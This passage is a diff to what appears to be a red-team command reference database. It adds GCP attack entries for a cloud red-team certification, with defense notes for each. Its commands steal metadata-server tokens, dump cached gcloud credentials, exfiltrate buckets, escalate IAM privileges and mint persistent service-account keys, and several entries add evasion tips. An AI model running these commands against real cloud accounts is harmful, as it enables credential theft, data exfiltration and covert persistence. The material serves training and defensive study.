@@ -24280,6 +24280,668 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "gcp-authentication",
+      "name": "GCP Authentication (gcloud user / service-account / token)",
+      "command": "gcloud auth activate-service-account --key-file <sa_key>.json",
+      "description": "Authenticate to Google Cloud with gcloud as a compromised user (OAuth) or service account (JSON key), or by using a stolen OAuth access token. First step for all GCP red-team operations.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "credentials"
+      ],
+      "tools": [
+        "gcloud"
+      ],
+      "tags": [
+        "gcp",
+        "authentication",
+        "service-account",
+        "access-token",
+        "gcloud",
+        "mcrta"
+      ],
+      "category": "Enumeration",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "User account (OAuth, opens browser)",
+          "command": "gcloud auth login"
+        },
+        {
+          "label": "Service account with a stolen JSON key",
+          "command": "gcloud auth activate-service-account --key-file <sa_key>.json"
+        },
+        {
+          "label": "List authenticated accounts + active config",
+          "command": "gcloud auth list\ngcloud config list"
+        },
+        {
+          "label": "Use a stolen OAuth access token directly",
+          "command": "gcloud projects list --access-token-file token.txt"
+        }
+      ],
+      "notes": "Credential types: long-term = Gmail/Workspace/Cloud Identity user pw, or a service-account JSON key file; short-term = OAuth access token. A leaked SA JSON key is game over for that SA's permissions - activate it and you ARE the service account. Tokens can be passed with --access-token-file <file> on most gcloud commands (no full login). After auth, 'gcloud auth list' shows the active identity and 'gcloud config list' shows the active project. gcloud stores creds on disk (see gcp-stored-credentials) - a foothold on a dev box often yields active tokens/keys.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - gcloud auth",
+          "url": "https://cloud.google.com/sdk/gcloud/reference/auth"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-iam-enum",
+          "rel": "next",
+          "note": "Enumerate IAM policies/roles once authenticated"
+        },
+        {
+          "id": "gcp-stored-credentials",
+          "rel": "alternative",
+          "note": "Harvest gcloud creds from a compromised host"
+        }
+      ],
+      "opsec": "moderate",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1078.004"
+      ],
+      "defense": {
+        "why_it_works": "GCP identities authenticate via OAuth (users) or service-account keys, and any valid key or token grants API access at that identity's IAM-granted scope with no host access required. Service-account JSON keys are long-lived bearer secrets - whoever holds the file can act as the SA until the key is revoked.",
+        "prerequisites": "A valid credential: user OAuth login, a service-account JSON key file, or an OAuth access token.",
+        "impact": "T1078.004 Valid Accounts: Cloud Accounts. API access to GCP at the identity's IAM privilege - the entry point for all GCP enumeration and attack.",
+        "detection": "Cloud Audit Logs (Admin Activity / Data Access): authentication and API calls from new IPs/user agents; service-account key usage from unexpected locations; sudden use of a dormant SA. Login Challenge / MFA events for users.",
+        "artifacts": "Cloud Audit Log entries (authenticationInfo.principalEmail, callerIp, userAgent); SA key-based API calls.",
+        "prevention": "Prefer Workload Identity Federation / attached service accounts over downloadable SA keys; disable SA key creation via org policy (iam.disableServiceAccountKeyCreation). Enforce MFA/2SV and context-aware access for users. Rotate/limit key lifetime; alert on SA key usage anomalies.",
+        "evasion": "Use a token or an existing SA key, call from an allowed region, and mimic the SA's normal API patterns.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1078/004/"
+        ],
+        "misconfiguration": "Downloadable service-account keys enabled and long-lived; no MFA on users; over-privileged service accounts (Owner/Editor).",
+        "vulnerable_config": "# Leaked SA key with Editor/Owner -> full access:\ngcloud auth activate-service-account --key-file leaked-sa.json   # now you are the SA",
+        "secure_config": "# Org policy: constraints/iam.disableServiceAccountKeyCreation = true\n# Use Workload Identity Federation / attached SAs instead of keys; enforce 2SV;\n# least-privilege SA roles; alert on SA key usage in Cloud Audit Logs."
+      }
+    },
+    {
+      "id": "gcp-storage-exfil",
+      "name": "GCP Cloud Storage Enumeration & Exfiltration",
+      "command": "gcloud storage ls gs://<bucket> --access-token-file token.txt",
+      "description": "Enumerate and pull objects from Cloud Storage buckets with a stolen token or SA. Buckets frequently hold secrets - service-account key files, .env, terraform state, backups - so this both exfiltrates data and often yields fresh, more-privileged credentials to pivot with.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "credentials"
+      ],
+      "tools": [
+        "gcloud"
+      ],
+      "tags": [
+        "gcp",
+        "cloud-storage",
+        "exfiltration",
+        "service-account-key",
+        "secrets",
+        "mcrta"
+      ],
+      "category": "Enumeration",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "List buckets, then objects",
+          "command": "gcloud storage ls --access-token-file token.txt\ngcloud storage ls gs://<bucket> --access-token-file token.txt"
+        },
+        {
+          "label": "Download a leaked SA key from a bucket",
+          "command": "gcloud storage cp gs://<bucket>/<sa_key>.json . --access-token-file token.txt"
+        },
+        {
+          "label": "Pivot: authenticate as the exfiltrated SA",
+          "command": "gcloud auth activate-service-account --key-file <sa_key>.json\ngcloud projects get-iam-policy <project_id> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<sa_email>\" --format=\"value(bindings.role)\""
+        },
+        {
+          "label": "Recursively grab a whole prefix",
+          "command": "gcloud storage cp -r gs://<bucket>/<prefix> ./loot --access-token-file token.txt"
+        }
+      ],
+      "notes": "Storage is where cloud credentials leak. Classic MCRTA chain: compute metadata token -> list storage -> find gs://devops-*/...-srvacc-key.json -> download -> activate that (more privileged) SA -> repeat get-iam-policy to find the next hop. Also look for terraform.tfstate (contains secrets), .env, backups, CI artifacts. Public buckets (allUsers/allAuthenticatedUsers) can be read with no creds at all. Use --access-token-file to operate with a stolen token without a full gcloud login.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - gcloud storage",
+          "url": "https://cloud.google.com/sdk/gcloud/reference/storage"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-authentication",
+          "rel": "next",
+          "note": "Activate an exfiltrated SA key to pivot"
+        },
+        {
+          "id": "gcp-iam-privesc",
+          "rel": "next",
+          "note": "Escalate with the newly obtained SA"
+        }
+      ],
+      "opsec": "loud",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1530",
+        "T1552.001"
+      ],
+      "defense": {
+        "why_it_works": "Any identity with storage.objects.list/get on a bucket can read its contents. Because teams routinely store SA key files, IaC state, and .env secrets in buckets - and sometimes grant allUsers/allAuthenticatedUsers - a token or SA with storage access yields both data and fresh, often more-privileged credentials.",
+        "prerequisites": "A credential/token with storage.buckets.list and storage.objects.get/list (or a public bucket for unauthenticated read).",
+        "impact": "T1530 Data from Cloud Storage Object + T1552.001 Unsecured Credentials: Credentials In Files. Data exfiltration plus credential pivots (leaked SA keys) that escalate access.",
+        "detection": "Cloud Audit Logs (Data Access) on storage.objects.get/list - large or unusual read volume, downloads of key/secret files, access from new principals/IPs. SCC public-bucket findings.",
+        "artifacts": "Storage Data Access log entries (objects.get/list); egress of key/tfstate/.env objects.",
+        "prevention": "Never store SA keys/secrets in buckets - use Secret Manager + Workload Identity. Enforce uniform bucket-level access + least-privilege IAM; remove allUsers/allAuthenticatedUsers; enable Data Access logs; VPC Service Controls to stop exfil to external projects; DLP scans for secrets in buckets.",
+        "evasion": "Target specific known object paths rather than listing everything; download during business hours; use the SA that normally accesses the bucket.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1530/",
+          "https://attack.mitre.org/techniques/T1552/001/"
+        ],
+        "misconfiguration": "SA keys / terraform state / .env stored in buckets; public (allUsers) buckets; overly broad storage roles; Data Access logs off.",
+        "vulnerable_config": "# Over-privileged token can list + pull a key file:\ngcloud storage cp gs://devops-bucket/devops-srvacc-key.json . --access-token-file token.txt",
+        "secure_config": "# Store secrets in Secret Manager, not buckets; enforce uniform bucket-level access + least privilege;\n# remove public bindings; enable Data Access audit logs; apply VPC Service Controls; run DLP on buckets."
+      }
+    },
+    {
+      "id": "gcp-metadata-token",
+      "name": "GCP Compute SA Token Theft (Metadata Server)",
+      "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"",
+      "description": "From code execution on (or header-controlling SSRF against) a GCE VM, pull the attached service account's OAuth access token from the metadata server, then use it with gcloud. Compute default SAs are frequently over-privileged (Editor), so this is a prime privilege-escalation / lateral-movement pivot.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "shell"
+      ],
+      "protocols": [
+        "http"
+      ],
+      "tools": [
+        "curl",
+        "gcloud"
+      ],
+      "tags": [
+        "gcp",
+        "metadata",
+        "token-theft",
+        "service-account",
+        "privilege-escalation",
+        "ssrf",
+        "mcrta"
+      ],
+      "category": "Privilege Escalation",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "Grab the attached SA's access token",
+          "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\""
+        },
+        {
+          "label": "List available SAs + scopes on the instance",
+          "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/\"\ncurl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes\""
+        },
+        {
+          "label": "Use the stolen token with gcloud",
+          "command": "echo -n '<access_token>' > token.txt\ngcloud projects list --access-token-file token.txt"
+        },
+        {
+          "label": "Check the SA's roles, then act",
+          "command": "gcloud projects get-iam-policy <project_id> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<compute_sa_email>\" --format=\"value(bindings.role)\""
+        }
+      ],
+      "notes": "The GCE metadata server (169.254.169.254 / metadata.google.internal) requires the 'Metadata-Flavor: Google' header - this blocks naive SSRF but NOT header-controlling SSRF, and any RCE on the box reaches it directly. Path .../service-accounts/default/token returns a short-lived OAuth token scoped by the instance's access scopes (legacy default scope 'cloud-platform' or restricted scopes limit what the token can do - check .../default/scopes). The default Compute Engine SA (PROJECTNUM-compute@developer.gserviceaccount.com) is Editor by default = huge. Classic chain: web SSRF/RCE on a GCE VM -> metadata token -> gcloud with the SA -> enumerate/exfil/escalate.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - VM metadata server",
+          "url": "https://cloud.google.com/compute/docs/metadata/overview"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-storage-exfil",
+          "rel": "next",
+          "note": "Exfil SA keys/data from storage with the token"
+        },
+        {
+          "id": "gcp-iam-enum",
+          "rel": "next",
+          "note": "Enumerate what the stolen SA can do"
+        },
+        {
+          "id": "ssrf-exploit",
+          "rel": "alternative",
+          "note": "Header-controlling SSRF can reach the metadata server"
+        }
+      ],
+      "opsec": "moderate",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1552.005",
+        "T1078.004"
+      ],
+      "defense": {
+        "why_it_works": "A GCE VM's attached service account can retrieve OAuth tokens from the local metadata server with no secret. Any code (or header-controlling SSRF) on the instance gets a token and acts as the SA, inheriting its IAM roles - which for the default Compute SA is typically project Editor, far more than the workload needs.",
+        "prerequisites": "Code execution on, or header-setting SSRF against, a GCE VM that has an attached service account (default or user-managed) with meaningful IAM roles and broad access scopes.",
+        "impact": "T1552.005 Unsecured Credentials: Cloud Instance Metadata API + T1078.004 Valid Accounts: Cloud Accounts. Attacker operates as the instance SA across GCP APIs - privilege escalation and lateral movement into the project.",
+        "detection": "Cloud Audit Logs: instance SA performing API calls inconsistent with the workload / from unusual sequences; token used for storage/IAM actions the app never does. VPC/SSRF: web requests to 169.254.169.254 or metadata.google.internal in app logs.",
+        "artifacts": "Audit Log entries by the compute SA principal; app/web logs showing metadata requests.",
+        "prevention": "Attach a least-privilege, purpose-built service account (never leave the default Editor SA). Set restricted access scopes. Enable metadata concealment / use GKE Workload Identity so pods can't read the node SA token. Fix SSRF (block link-local 169.254.0.0/16 egress, allowlist). Monitor SA usage anomalies.",
+        "evasion": "Use the short-lived token promptly, only for actions the SA normally performs, from the instance's expected context.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1552/005/"
+        ],
+        "misconfiguration": "Default Compute Engine SA (Editor) attached with the legacy 'cloud-platform' scope on an internet-facing VM; SSRF that can set headers.",
+        "vulnerable_config": "# Default SA (Editor) + broad scope + SSRF/RCE:\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+        "secure_config": "# Attach a dedicated least-privilege SA with narrow scopes (not the default Editor SA).\n# Enable metadata concealment / GKE Workload Identity; block workload egress to 169.254.169.254;\n# remediate SSRF; alert on anomalous SA API usage."
+      }
+    },
+    {
+      "id": "gcp-stored-credentials",
+      "name": "GCP Credential Theft from gcloud Config (disk)",
+      "command": "sqlite3 ~/.config/gcloud/access_tokens.db 'select account_id,access_token from access_tokens;'",
+      "description": "On a compromised host with the gcloud SDK, harvest cached credentials from the gcloud config directory: OAuth access/refresh tokens (access_tokens.db, credentials.db), legacy SA keys (legacy_credentials/), and Application Default Credentials. These let you re-authenticate as the host's user/SA from your own machine.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "shell"
+      ],
+      "tools": [
+        "gcloud",
+        "sqlite3"
+      ],
+      "tags": [
+        "gcp",
+        "credential-access",
+        "gcloud",
+        "token-theft",
+        "adc",
+        "pillage",
+        "mcrta"
+      ],
+      "category": "Credential Access",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "Locate the gcloud config dir",
+          "command": "# Linux/macOS: ~/.config/gcloud/\n# Windows: %APPDATA%\\gcloud\\  (C:\\Users\\<user>\\AppData\\Roaming\\gcloud)\nls ~/.config/gcloud/"
+        },
+        {
+          "label": "Dump cached OAuth tokens",
+          "command": "sqlite3 ~/.config/gcloud/access_tokens.db 'select account_id,access_token,token_expiry from access_tokens;'\nsqlite3 ~/.config/gcloud/credentials.db 'select account_id,value from credentials;'"
+        },
+        {
+          "label": "Grab ADC + legacy SA credentials",
+          "command": "cat ~/.config/gcloud/application_default_credentials.json\nls ~/.config/gcloud/legacy_credentials/*/"
+        },
+        {
+          "label": "Reuse a stolen token / refresh creds on your box",
+          "command": "gcloud projects list --access-token-file token.txt"
+        }
+      ],
+      "notes": "gcloud caches credentials in the config dir (CLOUDSDK_CONFIG; default ~/.config/gcloud on *nix, %APPDATA%\\gcloud on Windows). Loot: access_tokens.db (table access_tokens: account_id, access_token, token_expiry, rapt_token) - short-lived but immediately usable; credentials.db (table credentials: account_id, value) - contains refresh tokens = long-lived re-auth; legacy_credentials/<account>/ - older SA key material; application_default_credentials.json - ADC used by SDKs. Refresh tokens are the prize (persistent). Copy the whole gcloud dir to your box (set CLOUDSDK_CONFIG to it) to inherit the victim's sessions. Classic on any dev/CI host with gcloud installed.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - gcloud config / credentials",
+          "url": "https://cloud.google.com/sdk/docs/configurations"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-authentication",
+          "rel": "next",
+          "note": "Re-authenticate with the stolen token/creds"
+        },
+        {
+          "id": "gcp-iam-enum",
+          "rel": "next",
+          "note": "Enumerate what the stolen identity can do"
+        }
+      ],
+      "opsec": "moderate",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1552.001",
+        "T1528"
+      ],
+      "defense": {
+        "why_it_works": "The gcloud SDK caches OAuth access and refresh tokens (SQLite DBs), legacy SA keys, and Application Default Credentials in a predictable, user-readable config directory. Anyone with access to that user's files can copy the tokens/keys and re-authenticate as the identity from anywhere - refresh tokens give durable access.",
+        "prerequisites": "File access on a host with gcloud configured (developer workstation, CI runner, jump box) - as the user or root.",
+        "impact": "T1552.001 Unsecured Credentials: Credentials In Files + T1528 Steal Application Access Token. Re-authentication as the host's GCP user/SA off-host; refresh tokens = persistent access.",
+        "detection": "Cloud Audit Logs: the user's token used from a new IP/user agent shortly after host compromise; impossible travel. Endpoint: processes reading ~/.config/gcloud/*.db or copying the gcloud dir; sqlite access to access_tokens.db/credentials.db.",
+        "artifacts": "EDR/file-access telemetry on the gcloud config dir; audit-log sign-ins of the stolen identity from attacker infrastructure.",
+        "prevention": "Avoid standing gcloud logins on shared/CI hosts - use short-lived Workload Identity Federation / attached SAs. Protect and monitor the config dir; use OS credential protection. Enable context-aware access so tokens are bound to trusted devices/IPs. Rotate/revoke on host compromise (gcloud auth revoke; revoke refresh tokens).",
+        "evasion": "Reuse the token/refresh cred from an IP/region near the victim; import into your gcloud (CLOUDSDK_CONFIG) so calls mimic the user's normal usage.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1552/001/",
+          "https://attack.mitre.org/techniques/T1528/"
+        ],
+        "misconfiguration": "Long-lived gcloud logins/refresh tokens on shared or internet-exposed hosts; no context-aware access binding tokens to devices.",
+        "vulnerable_config": "# Any local file access yields reusable creds:\ncp -r ~/.config/gcloud /tmp/exfil   # refresh tokens + ADC + legacy keys",
+        "secure_config": "# Use Workload Identity Federation / attached SAs instead of persistent gcloud logins on servers/CI;\n# enable context-aware access (device/IP-bound); monitor access to the gcloud config dir;\n# revoke tokens on host compromise (gcloud auth revoke)."
+      }
+    },
+    {
+      "id": "gcp-iam-enum",
+      "name": "GCP IAM & Resource Enumeration (gcloud)",
+      "command": "gcloud projects get-iam-policy <project_id>",
+      "description": "Enumerate GCP IAM the way GCP works - resource-based policies, not identity-based. You can't list an identity's permissions directly, but you can read the IAM policy (role bindings) on orgs, projects, and resources, and enumerate service accounts, keys, and roles to find escalation paths.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "credentials"
+      ],
+      "tools": [
+        "gcloud"
+      ],
+      "tags": [
+        "gcp",
+        "iam",
+        "enumeration",
+        "role-binding",
+        "service-account",
+        "get-iam-policy",
+        "mcrta"
+      ],
+      "category": "Enumeration",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "Orgs / projects + their IAM policies",
+          "command": "gcloud organizations list\ngcloud organizations get-iam-policy <org_id>\ngcloud projects list\ngcloud projects get-iam-policy <project_id>"
+        },
+        {
+          "label": "Find exactly which roles a member holds (flatten/filter)",
+          "command": "gcloud projects get-iam-policy <project_id> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<sa_email>\" --format=\"value(bindings.role)\""
+        },
+        {
+          "label": "Service accounts + their keys",
+          "command": "gcloud iam service-accounts list\ngcloud iam service-accounts get-iam-policy <sa_email>\ngcloud iam service-accounts keys list --iam-account <sa_email>"
+        },
+        {
+          "label": "Roles + the permissions inside a role",
+          "command": "gcloud iam roles list\ngcloud iam roles describe roles/owner\ngcloud iam roles list --project <project_id>   # custom roles"
+        },
+        {
+          "label": "Resources (compute/storage)",
+          "command": "gcloud compute instances list\ngcloud storage ls"
+        }
+      ],
+      "notes": "KEY GCP concept: IAM is RESOURCE-based - policies attach to resources (org/folder/project/resource), not to identities, and inherit top-down (org -> folder -> project -> resource). So you enumerate 'who has what role on this resource' via get-iam-policy, then use --flatten/--filter to pin down a specific member's roles. Roles: Basic (Owner/Editor/Viewer), Predefined (roles/service.role), Custom. Permissions look like service.resource.verb (e.g. storage.objects.get). Members: user:, serviceAccount:, group:, domain:, allUsers, allAuthenticatedUsers (the last two = public!). Hunt for over-privileged SAs (Owner/Editor), 'allUsers' bindings, and SAs whose keys you can list/create.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - IAM policies",
+          "url": "https://cloud.google.com/iam/docs/policies"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-iam-privesc",
+          "rel": "next",
+          "note": "Turn a misconfigured IAM permission into privesc"
+        },
+        {
+          "id": "gcp-metadata-token",
+          "rel": "next",
+          "note": "Grab a compute SA token for more access"
+        }
+      ],
+      "opsec": "quiet",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1069.003",
+        "T1087.004",
+        "T1580"
+      ],
+      "defense": {
+        "why_it_works": "GCP IAM policies are readable by any principal with getIamPolicy on a resource (often broadly granted via Viewer/Editor). Because roles and bindings are enumerable, an attacker maps every member-role-resource relationship in scope and finds over-privileged SAs, public bindings (allUsers), and permissions that enable escalation.",
+        "prerequisites": "A credential with resourcemanager.projects.getIamPolicy (or org/SA equivalents) - included in Viewer and above.",
+        "impact": "T1069.003 Permission Groups Discovery: Cloud Groups + T1087.004 Account Discovery: Cloud Account + T1580 Cloud Infrastructure Discovery. A complete IAM map to plan privilege escalation and lateral movement.",
+        "detection": "Cloud Audit Logs (Data Access must be enabled): high volume of *.getIamPolicy / list calls from one principal; enumeration of service accounts and keys. Recommender/Security Command Center flags over-privileged principals attackers look for.",
+        "artifacts": "Cloud Audit Log getIamPolicy/list entries; SCC excess-permission findings.",
+        "prevention": "Least privilege - avoid Basic roles (Owner/Editor/Viewer) and prefer predefined/custom. Enable Data Access audit logs. Remove allUsers/allAuthenticatedUsers bindings. Use IAM Recommender + SCC to prune excess permissions. Restrict getIamPolicy where feasible.",
+        "evasion": "Query one project/resource at a time; avoid org-wide sweeps; use an SA whose normal job includes IAM reads.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1069/003/",
+          "https://attack.mitre.org/techniques/T1580/"
+        ],
+        "misconfiguration": "Basic roles granted broadly; service accounts with Owner/Editor; allUsers/allAuthenticatedUsers on resources; Data Access logs disabled (blind to enumeration).",
+        "vulnerable_config": "# SA bound as Owner at project scope -> enumeration reveals the escalation target:\ngcloud projects get-iam-policy <proj> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<sa>\" --format=\"value(bindings.role)\"  # roles/owner",
+        "secure_config": "# Replace Basic roles with least-privilege predefined/custom roles;\n# remove allUsers/allAuthenticatedUsers; enable Data Access audit logs;\n# use IAM Recommender + Security Command Center to enforce least privilege."
+      }
+    },
+    {
+      "id": "gcp-iam-privesc",
+      "name": "GCP IAM Privilege Escalation (misconfigured permissions)",
+      "command": "python3 check_for_privesc.py",
+      "description": "Turn a low-privileged GCP identity into a high-privileged one by abusing dangerous IAM permissions (e.g. iam.roles.update, iam.serviceAccounts.getAccessToken/actAs, iam.serviceAccountKeys.create, setIamPolicy, deploymentmanager). Enumerate the current member's permissions, find a privesc primitive, and exploit it.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "credentials"
+      ],
+      "tools": [
+        "gcloud",
+        "GCP-IAM-Privilege-Escalation"
+      ],
+      "tags": [
+        "gcp",
+        "iam",
+        "privilege-escalation",
+        "service-account",
+        "actas",
+        "rhinosecuritylabs",
+        "mcrta"
+      ],
+      "category": "Privilege Escalation",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "Enumerate the member's actual permissions",
+          "command": "python3 enumerate_member_permissions.py -p <project_id>"
+        },
+        {
+          "label": "Scan for privesc primitives",
+          "command": "python3 check_for_privesc.py"
+        },
+        {
+          "label": "Exploit a misconfigured permission (e.g. update a role you can edit)",
+          "command": "python3 exploit_scripts/iam.roles.update.py"
+        },
+        {
+          "label": "Impersonate a more-privileged SA (if you have actAs/getAccessToken)",
+          "command": "gcloud <cmd> --impersonate-service-account <target_sa_email>\ngcloud iam service-accounts keys create key.json --iam-account <target_sa_email>"
+        }
+      ],
+      "notes": "GCP privesc is about specific dangerous permissions rather than a single 'admin' flag. High-value primitives: iam.serviceAccounts.getAccessToken / iam.serviceAccounts.actAs / iam.serviceAccounts.implicitDelegation (impersonate a more-privileged SA), iam.serviceAccountKeys.create (mint a key for a better SA), iam.roles.update (add permissions to a role you can edit), *.setIamPolicy (bind yourself a better role), deploymentmanager.deployments.create + cloudfunctions/compute (run as a privileged SA), cloudbuild. RhinoSecurityLabs GCP-IAM-Privilege-Escalation automates enumeration (enumerate_member_permissions.py) and detection/exploitation (check_for_privesc.py + exploit_scripts/*). Manual path: gcloud iam service-accounts get-iam-policy to find SAs you can actAs, then --impersonate-service-account or keys create.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "RhinoSecurityLabs - GCP-IAM-Privilege-Escalation",
+          "url": "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-iam-enum",
+          "rel": "prereq",
+          "note": "Enumerate roles/bindings to find the primitive"
+        },
+        {
+          "id": "gcp-sa-key-persistence",
+          "rel": "next",
+          "note": "Persist by minting an SA key after escalating"
+        }
+      ],
+      "opsec": "loud",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1548",
+        "T1098.003"
+      ],
+      "defense": {
+        "why_it_works": "GCP grants fine-grained permissions through roles; several individual permissions are effectively 'admin-equivalent' because they let a principal act as, or grant rights to, a more-privileged identity - e.g. impersonating a service account (actAs/getAccessToken), creating a key for it, editing a role's permission set, or setting an IAM policy. A least-privileged-looking role that includes one of these is a full escalation path.",
+        "prerequisites": "A GCP identity holding at least one dangerous permission (iam.serviceAccounts.getAccessToken/actAs, iam.serviceAccountKeys.create, iam.roles.update, *.setIamPolicy, or a deploy/compute/function 'run-as' permission) over a more-privileged target.",
+        "impact": "T1548 Abuse Elevation Control Mechanism + T1098.003 Account Manipulation: Additional Cloud Roles. Escalation from a limited principal to a highly-privileged SA (up to Owner/Editor), enabling full project/org compromise.",
+        "detection": "Cloud Audit Logs: GenerateAccessToken / SignJwt on service accounts, service-account key creation, roles.update, SetIamPolicy, and deploymentmanager/cloudfunctions runs by unexpected principals. SCC/IAM Recommender flag these dangerous grants.",
+        "artifacts": "Audit Log: iam.serviceAccounts.getAccessToken, CreateServiceAccountKey, UpdateRole, SetIamPolicy events by the escalating principal.",
+        "prevention": "Least privilege - never grant actAs / getAccessToken / serviceAccountKeys.create / roles.update / setIamPolicy broadly. Separate duties. Use IAM Recommender + Policy Analyzer to find and remove escalation-enabling grants. Org policy to disable SA key creation. Alert on the audit events above.",
+        "evasion": "Prefer impersonation (token) over key creation (quieter); perform the escalation once and operate with the impersonated identity from normal contexts.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1548/",
+          "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation"
+        ],
+        "misconfiguration": "Non-admins granted actAs/getAccessToken over privileged SAs, serviceAccountKeys.create, iam.roles.update, or *.setIamPolicy; default Editor SAs reusable as escalation targets.",
+        "vulnerable_config": "# Principal can impersonate a project-Editor SA:\ngcloud iam service-accounts get-iam-policy <priv_sa>   # shows you as roles/iam.serviceAccountTokenCreator\ngcloud storage ls --impersonate-service-account <priv_sa>",
+        "secure_config": "# Remove actAs/getAccessToken/keys.create/roles.update/setIamPolicy from non-admin roles;\n# use IAM Recommender + Policy Analyzer to prune escalation paths; disable SA key creation via org policy;\n# alert on GenerateAccessToken/CreateServiceAccountKey/UpdateRole/SetIamPolicy in audit logs."
+      }
+    },
+    {
+      "id": "gcp-sa-key-persistence",
+      "name": "GCP Persistence via Service Account Key Creation",
+      "command": "gcloud iam service-accounts keys create key.json --iam-account <sa_email>",
+      "description": "Create a new JSON key for a service account you can manage (iam.serviceAccountKeys.create). The downloaded key is a long-lived, MFA-independent credential that authenticates as the SA - stealthy persistence that survives user password resets and outlives the original foothold.",
+      "type": "command",
+      "platform": "multi",
+      "requires": [
+        "credentials"
+      ],
+      "tools": [
+        "gcloud"
+      ],
+      "tags": [
+        "gcp",
+        "persistence",
+        "service-account",
+        "key-creation",
+        "credential-abuse",
+        "mcrta"
+      ],
+      "category": "Persistence",
+      "subcategory": "Cloud - GCP",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+      "examples": [
+        {
+          "label": "Mint a new key for a target SA",
+          "command": "gcloud iam service-accounts keys create bd.json --iam-account <sa_email>"
+        },
+        {
+          "label": "Authenticate as the SA with the new key (anywhere, anytime)",
+          "command": "gcloud auth activate-service-account --key-file bd.json"
+        },
+        {
+          "label": "List existing keys (spot yours / others')",
+          "command": "gcloud iam service-accounts keys list --iam-account <sa_email>"
+        }
+      ],
